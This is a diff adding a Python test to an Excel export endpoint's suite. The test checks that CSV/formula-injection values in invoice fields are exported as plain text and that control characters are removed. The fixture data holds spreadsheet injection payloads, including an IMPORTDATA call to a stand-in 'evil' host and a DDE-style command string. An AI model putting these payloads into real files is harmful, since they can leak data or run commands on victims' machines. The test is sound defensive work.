@@ -105,3 +105,30 @@ async def test_empty_period_gives_headers_only(api, auth):
     r = await api.client.get(URL, headers=auth, params=params())
     wb = book(r)
     assert wb["Документы"].max_row == 1 and wb["Позиции"].max_row == 1
+
+
+async def test_untrusted_text_stays_text_and_control_chars_removed(api, auth):
+    evil = DATA | {
+        "supplier": '=IMPORTDATA("http://evil")',
+        "buyer": "+cmd|' /C calc'!A0",
+        "supplier_inn": "0012345678",
+        "supplier_kpp": "@SUM(1)",
+        "bik": "bad\x00\x01chars\x1f",
+        "items": [{"name": "=HYPERLINK(1)", "qty": 1}],
+    }
+    await add_doc(api, auth, data=evil, created_at=datetime(2026, 10, 5, tzinfo=UTC))
+    r = await api.client.get(URL, headers=auth, params=params())
+    assert r.status_code == 200
+    wb = book(r)
+    docs = wb["Документы"]
+    header = [c.value for c in docs[1]]
+    row = {h: c for h, c in zip(header, docs[2], strict=True)}
+    for title, value in (
+        ("Поставщик", '=IMPORTDATA("http://evil")'),
+        ("Покупатель", "+cmd|' /C calc'!A0"),
+        ("КПП поставщика", "@SUM(1)"),
+        ("ИНН поставщика", "0012345678"),
+    ):
+        assert row[title].value == value and row[title].data_type == "s"
+    assert row["БИК банка поставщика"].value == "badchars"
+    assert wb["Позиции"]["C2"].value == "=HYPERLINK(1)" and wb["Позиции"]["C2"].data_type == "s"
